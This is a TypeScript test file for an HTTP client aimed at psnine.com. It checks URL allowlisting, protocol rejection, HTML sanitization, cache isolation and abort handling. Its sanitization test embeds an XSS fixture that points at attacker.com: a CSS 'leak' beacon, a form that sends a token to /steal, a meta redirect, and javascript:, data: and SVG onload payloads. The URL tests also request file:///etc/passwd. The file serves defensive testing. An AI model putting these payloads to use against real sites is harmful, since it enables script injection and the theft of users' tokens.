import { describe, it, expect, vi, beforeEach } from 'vitest';
import { createHttpClient } from '../../src/core/http';

describe('HttpClient implementation with deep security boundaries', () => {
  beforeEach(() => {
    vi.restoreAllMocks();
  });

  describe('URL security boundaries and validation', () => {
    const http = createHttpClient('https://psnine.com');

    it('rejects fake domain suffixes like evilpsnine.com and cross-origin HTML', async () => {
      await expect(http.text('https://evilpsnine.com/data')).rejects.toThrow('Cross-origin document fetch not allowed');
      await expect(http.json('https://notpsnine.com/api')).rejects.toThrow('Disallowed external JSON endpoint');
      await expect(http.text('https://fake-d7vg.com')).rejects.toThrow('Cross-origin document fetch not allowed');
    });

    it('rejects URLs with embedded credentials (user:pass@host)', async () => {
      await expect(http.text('https://admin:secret@psnine.com/topic/1')).rejects.toThrow('Embedded credentials not allowed');
    });

    it('rejects non-http(s) protocols', async () => {
      await expect(http.text('file:///etc/passwd')).rejects.toThrow('Protocol not allowed');
      await expect(http.text('ftp://psnine.com/dump')).rejects.toThrow('Protocol not allowed');
      await expect(http.text('javascript:alert(1)')).rejects.toThrow('Protocol not allowed');
    });

    it('allows official same-origin psnine and exact whitelisted api.frankfurter.dev origin', async () => {
      global.fetch = vi.fn().mockImplementation(async (url: string) => {
        if (url.includes('frankfurter')) {
          return {
            ok: true,
            status: 200,
            text: async () => JSON.stringify({ rates: {} }),
          } as Response;
        }
        return {
          ok: true,
          status: 200,
          text: async () => 'ok',
        } as Response;
      });

      await expect(http.json('https://api.frankfurter.dev/v1/latest?base=CNY')).resolves.toBeDefined();
      await expect(http.text('https://psnine.com/topic/123')).resolves.toBe('ok');
    });
  });

  describe('Deep document sanitization against XSS & dangerous elements', () => {
    it('removes active elements (iframe, object, embed, base, meta refresh, form, style, link)', async () => {
      const maliciousHtml = `
        <html>
          <head>
            <base href="https://attacker.com/">
            <meta http-equiv="refresh" content="0;url=https://attacker.com/">
            <meta name="description" content="Safe meta">
            <style>body { background: url('https://attacker.com/leak'); }</style>
            <link rel="stylesheet" href="https://attacker.com/evil.css">
          </head>
          <body>
            <iframe srcdoc="<script>alert(1)</script>"></iframe>
            <object data="evil.swf"></object>
            <embed src="evil.pdf">
            <form action="https://attacker.com/steal"><input name="token"></form>
            <script>alert('script')</script>
            <a href="java\nscript:alert(1)" id="bad-proto">Bad link</a>
            <a href="data:text/html;base64,PHNjcmlwdD4=" id="bad-data">Bad data</a>
            <a href="data:image/svg+xml;utf8,<svg onload=alert(1)>" id="bad-svg-data">Bad SVG</a>
            <img src="data:image/png;base64,iVBORw0KGgo=" id="safe-img">
            <img srcset="/pic1.jpg 1x, /pic2.jpg 2x" id="rel-srcset">
            <img srcset="javascript:alert(1) 1x, /safe.jpg 2x" id="evil-srcset">
            <a href="/psngame/123" id="rel-link">Relative</a>
          </body>
        </html>
      `;

      global.fetch = vi.fn().mockResolvedValue({
        ok: true,
        status: 200,
        text: async () => maliciousHtml,
      } as Response);

      const http = createHttpClient('https://psnine.com');
      const doc = await http.document('https://psnine.com/topic/999');

      expect(doc.querySelectorAll('iframe').length).toBe(0);
      expect(doc.querySelectorAll('object').length).toBe(0);
      expect(doc.querySelectorAll('embed').length).toBe(0);
      expect(doc.querySelectorAll('base').length).toBe(0);
      expect(doc.querySelectorAll('form').length).toBe(0);
      expect(doc.querySelectorAll('script').length).toBe(0);
      expect(doc.querySelectorAll('style').length).toBe(0);
      expect(doc.querySelectorAll('link').length).toBe(0);
      expect(doc.querySelectorAll('meta[http-equiv]').length).toBe(0);
      expect(doc.querySelector('meta[name="description"]')).not.toBeNull();

      expect(doc.querySelector('#bad-proto')?.getAttribute('href')).toBeNull();
      expect(doc.querySelector('#bad-data')?.getAttribute('href')).toBeNull();
      expect(doc.querySelector('#bad-svg-data')?.getAttribute('href')).toBeNull();

      expect(doc.querySelector('#safe-img')?.getAttribute('src')).toContain('data:image/png');
      expect(doc.querySelector('#rel-link')?.getAttribute('href')).toBe('https://psnine.com/psngame/123');

      // Check srcset sanitization and resolution
      const relSrcset = doc.querySelector('#rel-srcset')?.getAttribute('srcset');
      expect(relSrcset).toContain('https://psnine.com/pic1.jpg 1x');
      expect(relSrcset).toContain('https://psnine.com/pic2.jpg 2x');

      const evilSrcset = doc.querySelector('#evil-srcset')?.getAttribute('srcset');
      expect(evilSrcset).not.toContain('javascript');
      expect(evilSrcset).toContain('https://psnine.com/safe.jpg 2x');
    });
  });

  describe('Cache & In-flight isolation by request type', () => {
    it('isolates text and json responses without collision or shared mutation', async () => {
      const jsonResponse = { status: 'success', count: 42 };
      const textResponse = '<html><body>Hello World</body></html>';

      global.fetch = vi.fn().mockImplementation(async (url: string) => {
        if (url.includes('/api/')) {
          return {
            ok: true,
            status: 200,
            text: async () => JSON.stringify(jsonResponse),
          } as Response;
        }
        return {
          ok: true,
          status: 200,
          text: async () => textResponse,
        } as Response;
      });

      const http = createHttpClient('https://psnine.com');
      const docUrl = 'https://psnine.com/topic/doc';
      const apiUrl = 'https://psnine.com/api/test';

      const [textRes, jsonRes] = await Promise.all([
        http.text(docUrl, { ttl: 5000 }),
        http.json(apiUrl, { ttl: 5000 }),
      ]);

      expect(typeof textRes).toBe('string');
      expect(textRes).toBe(textResponse);

      expect(typeof jsonRes).toBe('object');
      expect(jsonRes).toEqual(jsonResponse);

      // Verify cached requests return independent instances
      const doc1 = await http.document(docUrl, { ttl: 5000 });
      doc1.body.innerHTML = 'mutated';

      const doc2 = await http.document(docUrl, { ttl: 5000 });
      // doc2 MUST NOT be mutated by doc1's DOM changes!
      expect(doc2.body.innerHTML).toContain('Hello World');
    });
  });

  describe('Signal abort handling in queue and in-flight', () => {
    it('rejects immediately if signal is already aborted', async () => {
      const http = createHttpClient('https://psnine.com');
      const controller = new AbortController();
      controller.abort();

      await expect(http.text('https://psnine.com/topic/1', { signal: controller.signal })).rejects.toThrow('aborted');
    });

    it('does not share in-flight promises across callers with AbortSignal, so aborting caller A does not abort caller B', async () => {
      let fetchCallCount = 0;
      global.fetch = vi.fn().mockImplementation((url: string, init?: RequestInit) => {
        fetchCallCount++;
        return new Promise<Response>((resolve, reject) => {
          const timer = setTimeout(() => {
            resolve({ ok: true, status: 200, text: async () => 'completed' } as Response);
          }, 50);

          if (init?.signal) {
            init.signal.addEventListener('abort', () => {
              clearTimeout(timer);
              reject(new DOMException('The operation was aborted.', 'AbortError'));
            });
          }
        });
      });

      const http = createHttpClient('https://psnine.com');
      const controllerA = new AbortController();

      const promiseA = http.text('https://psnine.com/topic/shared', { signal: controllerA.signal });
      const promiseB = http.text('https://psnine.com/topic/shared'); // Caller B has no signal

      // Abort caller A
      controllerA.abort();

      await expect(promiseA).rejects.toThrow('aborted');
      // Caller B should succeed independently and not be canceled by A's abort
      await expect(promiseB).resolves.toBe('completed');
    });

    it('aborts queued request waiting for concurrency slot', async () => {
      const resolvers: Array<() => void> = [];
      global.fetch = vi.fn().mockImplementation((url: string) => {
        if (url.includes('block')) {
          return new Promise<Response>(resolve => {
            resolvers.push(() => resolve({ ok: true, status: 200, text: async () => 'done' } as Response));
          });
        }
        return Promise.resolve({ ok: true, status: 200, text: async () => 'instant' } as Response);
      });

      const http = createHttpClient('https://psnine.com');
      const abortCtrl = new AbortController();

      const p1 = http.text('https://psnine.com/block-1');
      const p2 = http.text('https://psnine.com/block-2');
      const p3 = http.text('https://psnine.com/queued-3', { signal: abortCtrl.signal });

      abortCtrl.abort();

      await expect(p3).rejects.toThrow('aborted');

      resolvers.forEach(r => r());
      await p1;
      await p2;
    });
  });
});
